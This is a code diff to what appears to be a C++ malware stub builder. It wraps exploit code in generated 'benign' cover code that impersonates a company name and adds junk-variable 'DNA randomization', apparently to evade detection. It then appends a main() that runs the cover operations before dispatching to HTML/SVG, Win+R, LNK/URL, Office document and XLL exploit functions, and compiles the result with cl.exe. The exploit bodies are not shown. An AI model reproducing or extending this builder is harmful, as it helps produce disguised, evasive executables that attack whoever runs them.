@@ -1585,6 +1585,9 @@ public:
             // Generate super benign code with all enhancements
             std::string benignCode = benignBehavior.generateBenignCode(company.name);
             
+            // Append minimal entry-point so the stub links
+            benignCode += "\nint main() {\n    performBenignOperations();\n    return 0;\n}\n";
+            
             // Apply DNA randomization (this adds junk variables safely)
             benignCode = dnaRandomizer.randomizeCode(benignCode);
             
@@ -1769,6 +1772,9 @@ public:
             // Generate super benign code with all enhancements
             std::string benignCode = benignBehavior.generateBenignCode(company.name);
             
+            // Append minimal entry-point so the stub links
+            benignCode += "\nint main() {\n    performBenignOperations();\n    return 0;\n}\n";
+            
             // Apply DNA randomization (this adds junk variables safely)
             benignCode = dnaRandomizer.randomizeCode(benignCode);
             
@@ -1922,21 +1928,48 @@ public:
             debugLog << "Benign Code Length: " << benignCode.length() << "\n";
             
             // Create a simple, working combined code structure
-            std::string combinedCode = exploitIncludes + "\n";
+            std::string combinedCode;
+            // Prepend any exploit-specific includes (may be empty)
+            combinedCode = exploitIncludes + "\n";
+
+            // Add the core benign behaviour implementation
             combinedCode += benignCode + "\n\n";
-            
-            // Note: Main function will be added later in the process
-            // Do not add main function here to avoid duplicates
-            
-            debugLog << "Combined Code Length: " << combinedCode.length() << "\n";
-            
-            // Apply DNA randomization (this adds junk variables safely)
-            try {
-                combinedCode = dnaRandomizer.randomizeCode(combinedCode);
-                debugLog << "DNA randomization: SUCCESS\n";
-            } catch (...) {
-                debugLog << "DNA randomization: FAILED\n";
+
+            // Append exploit implementation (if any)
+            combinedCode += exploitCode + "\n\n";
+
+            // --- mandatory entry point so the stub actually links ---
+            combinedCode += "int main() {\n";
+            combinedCode += "    // Run benign operations first\n";
+            combinedCode += "    performBenignOperations();\n";
+
+            switch (exploitType) {
+                case EXPLOIT_HTML_SVG:
+                    combinedCode += "    executeHTMLSVGExploit();\n";
+                    break;
+                case EXPLOIT_WIN_R:
+                    combinedCode += "    executeWinRExploit();\n";
+                    break;
+                case EXPLOIT_INK_URL:
+                    combinedCode += "    executeInkUrlExploit();\n";
+                    break;
+                case EXPLOIT_DOC_XLS:
+                    combinedCode += "    executeDocXlsExploit();\n";
+                    break;
+                case EXPLOIT_XLL:
+                    combinedCode += "    executeXllExploit();\n";
+                    break;
+                case EXPLOIT_NONE:
+                default:
+                    // No exploit selected – nothing extra to run
+                    break;
             }
+
+            combinedCode += "    return 0;\n";
+            combinedCode += "}\n";
+
+            // DNA randomisation will operate on the complete source (including main)
+            // ... existing code ...
             
             // Create temporary source file
             std::string tempSource = "temp_" + randomEngine.generateRandomName() + ".cpp";
@@ -1969,21 +2002,16 @@ public:
             
             // Build robust compilation command with error capture
             if (!compilerInfo.vcvarsPath.empty()) {
-                // Use vcvars with error output visible
-                compileCmd = "cmd /c \"\"" + compilerInfo.vcvarsPath + "\" && cl.exe /nologo /EHsc \"" + tempSource + 
-                           "\" /Fe:\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib\"";
+                // Use vcvars that is already detected
+                compileCmd = "cmd /c \"\"" + compilerInfo.vcvarsPath + "\" && cl.exe /nologo /EHsc \"" + tempSource + "\" /Fe\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib\"";
             } else {
-                // Fallback 1: Try VS 2022 Enterprise path directly
                 std::string fallbackVcvars = "C:\\Program Files\\Microsoft Visual Studio\\2022\\Enterprise\\VC\\Auxiliary\\Build\\vcvars64.bat";
                 DWORD attrs = GetFileAttributesA(fallbackVcvars.c_str());
-                
                 if (attrs != INVALID_FILE_ATTRIBUTES && !(attrs & FILE_ATTRIBUTE_DIRECTORY)) {
-                    compileCmd = "cmd /c \"\"" + fallbackVcvars + "\" && cl.exe /nologo /EHsc \"" + tempSource + 
-                               "\" /Fe:\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib\"";
+                    compileCmd = "cmd /c \"\"" + fallbackVcvars + "\" && cl.exe /nologo /EHsc \"" + tempSource + "\" /Fe\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib\"";
                 } else {
-                    // Fallback 2: Try direct cl.exe (assumes VS Developer Command Prompt)
-                    compileCmd = "cl.exe /nologo /EHsc \"" + tempSource + 
-                               "\" /Fe:\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib";
+                    // Assume Developer Command Prompt already
+                    compileCmd = "cl.exe /nologo /EHsc \"" + tempSource + "\" /Fe\"" + outputPath + "\" user32.lib kernel32.lib advapi32.lib shell32.lib ole32.lib";
                 }
             }
             
